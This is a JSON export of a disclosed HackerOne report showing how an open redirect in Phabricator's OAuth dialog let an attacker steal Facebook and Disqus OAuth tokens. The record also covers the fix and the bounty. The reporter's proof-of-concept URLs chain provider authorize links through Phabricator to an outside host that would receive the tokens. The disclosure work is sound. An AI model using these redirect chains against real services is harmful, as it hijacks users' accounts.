{"id":3930,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zOTMw","url":"https://hackerone.com/reports/3930","title":"OAuth Stealing Attack (New)","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2014-03-13T14:08:40.477Z","submitted_at":"2014-03-13T14:08:40.477Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"krangbuster","url":"/krangbuster","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/003/495/375adba2f29a55536eac05aedcef905aad42ff64_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":18,"url":"https://hackerone.com/phabricator","handle":"phabricator","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/018/61446f7e6f0684c8c9f7c36c918b7ecd58183588_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/018/61446f7e6f0684c8c9f7c36c918b7ecd58183588_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Phabricator","twitter_handle":"phabricator","website":"http://phacility.com/phabricator/","about":"Phabricator is a collection of open source web applications that help software companies build better software."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2014-04-13T12:37:27.935Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2014-03-14T12:41:39.152Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi Evan,\r\n\r\nI found a new and more dangerous way to steal phabricator facebooks oauth tokens,codes,\r\n\r\nIn this case, I exploited the behavior of Phabricator OAuth Dialog,\r\n\r\nIf you provide a differnet scope in phabricator OAuth Dialog (https://secure.phabricator.com/oauthserver/auth/?redirect_uri=http://files.nirgoldshlager.com\u0026response_type=code\u0026client_id=PHID-OASC-oyfqtnanxsukiw5lsnce\u0026scope=ggg) you will be redirected automatically to the attacker site, In this case, I exploited this behavior to exploit the Phabricator Facebook. Disqus OAuth Providers\r\n\r\nPoC for Facebook:\r\n\r\nhttps://www.facebook.com/dialog/oauth?client_id=184510521580034\u0026response_type=token\u0026redirect_uri=https://secure.phabricator.com/oauthserver/auth/?redirect_uri=http://files.nirgoldshlager.com%26response_type=code%26client_id=PHID-OASC-oyfqtnanxsukiw5lsnce%26scope=ggg\r\n\r\nPoC for Disques:\r\n\r\nhttps://disqus.com/api/oauth/2.0/authorize/?client_id=pGsV2eD61zrctO8A9n9QAA41dRASTXxSBFgs4nieqiwviSroKP5UV1wutlHp8d5y\u0026scope=read\u0026redirect_uri=https://secure.phabricator.com/oauthserver/auth/?redirect_uri=http://files.nirgoldshlager.com%26response_type=code%26client_id=PHID-OASC-oyfqtnanxsukiw5lsnce%26scope=ggg\u0026response_type=token\r\n\r\nETC...\r\n\r\nThe user don't need to be login to perform this kind of attack, it works only via one click, no any continue or another intercation, This attack also need to works on other provides in Phabricator via redirect_uri.\r\n\r\nPoC Video:\r\n\r\nhttps://drive.google.com/file/d/0B2-5ltUODX1La0Vjc0ZuemMzRTQ/edit?usp=sharing","bounty_amount":"400.0","formatted_bounty":"$400","weakness":{"id":53,"name":"Open Redirect"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2014-04-13T11:37:19.660Z","allow_singular_disclosure_after":-236575078.2804323,"singular_disclosure_allowed":true,"vote_count":5,"voters":["fantam1","japz","cryptographer","nafisaqil","satyamdixit"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":16355,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks, looking at this now.","automated_response":false,"created_at":"2014-03-13T14:34:40.303Z","updated_at":"2014-03-13T14:34:40.303Z","actor":{"username":"epriestley","cleared":false,"url":"/epriestley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/043/3ebca5250ea5abd54b49ccc9d69c636af4585b2e_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":16418,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This should be fixed by:\n\nhttps://secure.phabricator.com/D8517\n\nMore discussion in:\n\nhttps://secure.phabricator.com/T4593","automated_response":false,"created_at":"2014-03-13T17:08:03.973Z","updated_at":"2014-03-13T17:08:03.973Z","actor":{"username":"epriestley","cleared":false,"url":"/epriestley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/043/3ebca5250ea5abd54b49ccc9d69c636af4585b2e_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":16431,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"quick and professional like always,\n\n\nThanks,\n\nNir","automated_response":false,"created_at":"2014-03-13T17:23:19.619Z","updated_at":"2014-03-13T17:23:19.619Z","actor":{"username":"krangbuster","cleared":false,"url":"/krangbuster","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/495/375adba2f29a55536eac05aedcef905aad42ff64_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":16436,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"last question,\n\nit should be fixed in production (secure.phabricator.com)?,\n\nbecause OAuth stealling via disqus provider is still works:\n\nhttps://disqus.com/api/oauth/2.0/authorize/?client_id=pGsV2eD61zrctO8A9n9QAA41dRASTXxSBFgs4nieqiwviSroKP5UV1wutlHp8d5y\u0026scope=read\u0026redirect_uri=https://secure.phabricator.com/oauthserver/auth/?redirect_uri=http://files.nirgoldshlager.com%26response_type=code%26client_id=PHID-OASC-oyfqtnanxsukiw5lsnce%26scope=ggg\u0026response_type=token\n\n\n\n","automated_response":false,"created_at":"2014-03-13T17:28:45.697Z","updated_at":"2014-03-13T17:28:45.697Z","actor":{"username":"krangbuster","cleared":false,"url":"/krangbuster","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/495/375adba2f29a55536eac05aedcef905aad42ff64_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":16437,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"No, it's still under review. It will probably land some time later today. I have to run to a meeting, but I'll look at your other MITM report when I get back. Thanks for all your help!","automated_response":false,"created_at":"2014-03-13T17:30:08.832Z","updated_at":"2014-03-13T17:30:08.832Z","actor":{"username":"epriestley","cleared":false,"url":"/epriestley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/043/3ebca5250ea5abd54b49ccc9d69c636af4585b2e_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":16439,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"NP,\n\nLater...","automated_response":false,"created_at":"2014-03-13T17:33:33.552Z","updated_at":"2014-03-13T17:33:33.552Z","actor":{"username":"krangbuster","cleared":false,"url":"/krangbuster","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/495/375adba2f29a55536eac05aedcef905aad42ff64_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":16553,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This should be live now, do you want to double check before I close it out? Your PoC link is defused for me now, at least.\n\n(We should strip the anchor even if the user authorizes the app now, too.)","automated_response":false,"created_at":"2014-03-13T20:06:35.376Z","updated_at":"2014-03-13T20:06:35.376Z","actor":{"username":"epriestley","cleared":false,"url":"/epriestley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/043/3ebca5250ea5abd54b49ccc9d69c636af4585b2e_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":16684,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Double check, Fixed","automated_response":false,"created_at":"2014-03-14T10:28:17.558Z","updated_at":"2014-03-14T10:28:17.558Z","actor":{"username":"krangbuster","cleared":false,"url":"/krangbuster","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/495/375adba2f29a55536eac05aedcef905aad42ff64_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":16696,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks! The fix was:\n\nhttps://secure.phabricator.com/rPae7324fd5b8abce97f5e62a6cfe1f25264e77758\n\nI added a link earlier, but for public/disclosure purposes, further discussion is here:\n\nhttps://secure.phabricator.com/T4593","automated_response":false,"created_at":"2014-03-14T12:37:19.756Z","updated_at":"2014-03-14T12:37:19.756Z","actor":{"username":"epriestley","cleared":false,"url":"/epriestley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/043/3ebca5250ea5abd54b49ccc9d69c636af4585b2e_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"krangbuster","url":"/krangbuster"},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":16697,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"This is similar to the previous issue. However, it has a lower barrier for attackers (the user doesn't need to click through a weird dialog). Still, it requires the attacker have access to create an OAuth server application.","automated_response":false,"created_at":"2014-03-14T12:41:14.922Z","updated_at":"2014-03-14T12:41:14.922Z","actor":{"url":"/phabricator","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/018/61446f7e6f0684c8c9f7c36c918b7ecd58183588_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Phabricator"}},"bounty_amount":"400.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"phabricator","collaborator":{"username":"krangbuster","url":"/krangbuster"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":16698,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"This can be disclosed at any time.","automated_response":false,"created_at":"2014-03-14T12:41:39.165Z","updated_at":"2014-03-14T12:41:39.165Z","actor":{"username":"epriestley","cleared":false,"url":"/epriestley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/043/3ebca5250ea5abd54b49ccc9d69c636af4585b2e_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":29705,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2014-04-13T12:37:27.947Z","updated_at":"2014-04-13T12:37:27.947Z","actor":{"url":"/phabricator","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/018/61446f7e6f0684c8c9f7c36c918b7ecd58183588_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Phabricator"}},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}